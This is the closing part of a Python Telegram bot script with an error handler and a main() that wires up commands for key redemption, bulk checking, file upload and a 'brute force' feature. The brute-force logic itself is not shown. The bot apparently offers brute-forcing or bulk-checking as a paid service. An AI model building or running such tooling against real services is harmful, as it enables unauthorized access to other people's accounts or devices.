        await safe_reply(
            update,
            "✅ *Cancelled*\n\nOperation cancelled. Use /start to return to main menu.",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error in cancel_command: {e}")

# ─── Error Handler ─────────────────────────────────────────────

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully"""
    try:
        logger.error(f"Update {update} caused error {context.error}")
        
        error_message = "❌ *An error occurred*\n\nPlease try again later."
        
        if isinstance(context.error, TimedOut):
            error_message = "⏰ *Request timed out*\n\nPlease try again."
        elif isinstance(context.error, NetworkError):
            error_message = "🌐 *Network error*\n\nPlease check your internet connection."
        elif isinstance(context.error, RetryAfter):
            error_message = f"⏳ *Rate limited*\n\nPlease wait {context.error.retry_after} seconds."
        
        try:
            if update and update.effective_message:
                await update.effective_message.reply_text(error_message, parse_mode='Markdown')
            elif update and update.callback_query:
                await update.callback_query.message.reply_text(error_message, parse_mode='Markdown')
        except:
            pass
    
    except Exception as e:
        logger.error(f"Error in error_handler: {e}")

# ────────────────────────────────────────────────────────────────
# MAIN APPLICATION
# ────────────────────────────────────────────────────────────────

def main():
    """Start the bot"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set your BOT_TOKEN in the script!")
        print("Open the script and replace 'YOUR_BOT_TOKEN_HERE' with your bot token.")
        sys.exit(1)
    
    try:
        application = (
            Application.builder()
            .token(BOT_TOKEN)
            .connect_timeout(30.0)
            .read_timeout(30.0)
            .write_timeout(30.0)
            .build()
        )
        
        # Add command handlers
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("redeem", redeem_command))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("cancel", cancel_command))
        
        # Add callback query handlers
        application.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu_"))
        application.add_handler(CallbackQueryHandler(keys_callback, pattern="^keys_|^kg_|^key_"))
        application.add_handler(CallbackQueryHandler(start_bulk_check_callback, pattern="^bulk_start$"))
        application.add_handler(CallbackQueryHandler(download_bulk_callback, pattern="^download_bulk$"))
        application.add_handler(CallbackQueryHandler(brute_callback, pattern="^brute_"))
        
        # Add message handler
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
        
        # Add error handler
        application.add_error_handler(error_handler)
        
        print("🤖 Premium Devid Seker Bot v5.2")
        print("👑 Created by: @ZyronDevv")
        print("🔗 Bot is running...")
        print("📊 Press Ctrl+C to stop")
        print("🛑 Brute Force now has a STOP button!")
        
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
    
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Bot stopped.")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
